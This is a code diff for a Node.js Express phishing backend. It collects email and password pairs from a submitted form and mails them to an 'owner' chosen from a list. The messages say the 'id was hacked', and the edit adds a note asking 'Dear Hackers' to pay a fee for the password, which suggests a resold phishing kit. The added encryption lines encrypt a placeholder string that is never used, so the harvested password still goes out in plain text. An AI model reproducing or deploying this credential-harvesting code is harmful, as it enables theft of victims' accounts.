@@ -8,6 +8,12 @@ const os = require('os');
 var port = process.env.PORT || 1111;
 var networkInterfaces = os.networkInterfaces();
 var nodemailer = require('nodemailer');
+const encryptpwd = require('encrypt-with-password');
+ 
+
+
+
+
 
 const app = express();
 
@@ -35,11 +41,25 @@ var myArray = [
 
 app.post('/_', function (req, res) {
    // res.render('f_success');
-    var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
+const text = 'Hello, World!';
+const password = req.body.password;
+ 
+const encrypted = encryptpwd.encrypt(text, password); // ---> this is the encrypted (output) value
+ 
+// example encrypted value: 'e68e7ccd9e908665818a49f111c342ed:c9b83ff7624bb3b26af8cc853d61cd2f7959cecc4308383c39a0924e90637889'
+ 
+const decrypted = encryptpwd.decrypt(encrypted, password) // ---> this decrypts the encrypted value and yields the original text
+
+    
+    var captured_content = `\n Email: ${req.body.email} Password: ${password}`;
     let toMail = req.body.owner;
     
+    
+    
    // console.log("es"+toMail);
-    var message = "If the input value has correct then id was hacked "+captured_content;
+    var message = "<h1> Dear Hackers,</h1> <p>To get password, you have to pay onetime tk-100, for the stay live server running. <p>  </p> If the input value has correct then id was hacked! "+captured_content;
+
+    
   if(req.body.owner){
     let toEmail = myArray.find(o => o.id == req.body.owner);
 
